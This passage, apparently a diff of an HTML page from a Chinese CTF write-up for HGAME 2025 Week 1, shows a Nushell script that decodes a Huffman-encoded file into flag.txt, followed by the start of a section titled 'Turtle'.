$current_node.b }</span><br><span class="line">        if 's' in $current_node {</span><br><span class="line">            $result ++= [$current_node.s]</span><br><span class="line">            $current_node = $tree</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    if 's' in $current_node {</span><br><span class="line">        $result ++= [$current_node.s]</span><br><span class="line">    }</span><br><span class="line">    $result | each { into binary } | bytes collect</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">def "decompress" [] {</span><br><span class="line">    let input = (open ./enc.txt --raw | split row "\n")</span><br><span class="line">    let tree = $input.0 | from json</span><br><span class="line">    let encoded_str = $input.1</span><br><span class="line">    decode $tree $encoded_str</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">decompress | save ./flag.txt --force</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight shell">def "decode" [tree encoded] {
+    let bits = ($encoded | split chars)
+    mut result = []
+    mut current_node = $tree
+    for bit in $bits {
+        $current_node = if $bit == '0' {
+            $current_node.a
+        } else { $current_node.b }
+        if 's' in $current_node {
+            $result ++= [$current_node.s]
+            $current_node = $tree
+        }
+    }
+    if 's' in $current_node {
+        $result ++= [$current_node.s]
+    }
+    $result | each { into binary } | bytes collect
+}
+
+def "decompress" [] {
+    let input = (open ./enc.txt --raw | split row "\n")
+    let tree = $input.0 | from json
+    let encoded_str = $input.1
+    decode $tree $encoded_str
+}
+
+decompress | save ./flag.txt --force</code></pre>
 <p><em>部分内容参考 DeepSeek R1 生成</em></p>
 <h1 id="turtle">Turtle</h1>
 <p><img src="\202518-HGAME-2025-Week-1-Writeup\image-20250210205306105.png"></p>
